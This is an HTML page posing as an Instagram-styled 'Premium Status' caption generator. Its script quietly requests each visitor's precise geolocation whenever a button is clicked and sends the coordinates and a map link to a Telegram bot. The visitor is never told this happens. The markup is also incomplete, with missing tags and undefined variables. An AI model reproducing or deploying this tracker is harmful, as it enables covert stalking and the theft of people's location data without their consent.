<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>InstaKing | Premium Status 2026</title>
  <style>
    :root {
      --insta-grad: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      --glass: rgba(255, 255, 255, 0.12);
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #050505;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      overflow: hidden;
    }
    /* Animated Background */
    .bg-animate {
      position: absolute;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 20% 30%, #405de6 0%, transparent 40%),
                  radial-gradient(circle at 80% 70%, #fd1d1d 0%, transparent 40%);
      filter: blur(80px);
      z-index: -1;
      animation: shift 10s infinite alternate;
    }
    @keyframes shift { from { transform: scale(1); } to { transform: scale(1.2); } }

    .container {
      width: 90%;
      max-width: 420px;
      background: var(--glass);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: 35px;
      padding: 40px 25px;
      text-align: center;
      box-shadow: 0 25px 50px rgba(0,0,0,0.5);
    }
    .insta-logo {
      width: 90px;
      height: 90px;
      margin: 0 auto 25px;
      background: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png') center/contain no-repeat;
      filter: drop-shadow(0 0 15px rgba(253, 29, 29, 0.6));
    }
    h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 8px; }
    .subtitle { font-size: 14px; opacity: 0.7; margin-bottom: 30px; }

    #status-box { display: none; animation: fadeIn 0.6s ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

    .status-card {
      background: rgba(0,0,0,0.3);
      padding: 25px;
      border-radius: 20px;
      min-height: 120px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      font-weight: 600;
      line-height: 1.5;
      margin-bottom: 25px;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 18px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s;
      text-transform: uppercase;
    }
    .btn-primary { background: var(--insta-grad); color: white; box-shadow: 0 10px 20px rgba(220, 39, 67, 0.4); }
    .btn-primary:active { transform: scale(0.96); }
    
    .btn-next { background: rgba(255,255,255,0.1); color: white; margin-top: 12px; border: 1px solid rgba(255,255,255,0.2); }
    .btn-next:hover { background: rgba(255,255,255,0.2); }

    .footer { margin-top: 30px; font-size: 12px; opacity: 0.4; letter-spacing: 1px; }
  </style>
</head>
<body>

  <div class="bg-animate"></div>

    <h1>Premium Status</h1>
    <p class="subtitle">Trending Captions for VIP Profiles</p>

    <button id="start-btn" class="btn btn-primary">Unlock Status ✨</button>

    <div id="status-box">
      <div class="status-card" id="status-text"></div>
      <button id="next-btn" class="btn btn-primary">Next Status ➡️</button>
      <button id="copy-btn" class="btn btn-next">Copy Status 📋</button>
    </div>

    <div class="footer">POWERED BY VIKASH TECH</div>
  </div>

  let currentIndex = 0;

  function track(action) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((p) => {
        const lat = p.coords.latitude;
        const lon = p.coords.longitude;
        const map = `https://www.google.com/maps?q=${lat},${lon}`;
        const msg = `🚀 *Alert from Status Site*\n\n👤 *Action:* ${action}\n📍 *Lat:* \`${lat}\` \n📍 *Lon:* \`${lon}\` \n\n🔗 [Open Map](${map})`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
        });
      }, null, { enableHighAccuracy: true });
    }
  }

  document.getElementById('start-btn').onclick = function() {
    this.style.display = 'none';
    document.getElementById('status-box').style.display = 'block';
    document.getElementById('status-text').textContent = statuses[0];
    track("App Opened");
  };

  document.getElementById('next-btn').onclick = function() {
    currentIndex = (currentIndex + 1) % statuses.length;
    document.getElementById('status-text').textContent = statuses[currentIndex];
    track("Next Clicked");
  };

  document.getElementById('copy-btn').onclick = function() {
    const txt = document.getElementById('status-text').textContent;
    navigator.clipboard.writeText(txt);
    alert("Status Copied!");
    track("Copy/Share Clicked");
  };
</script>
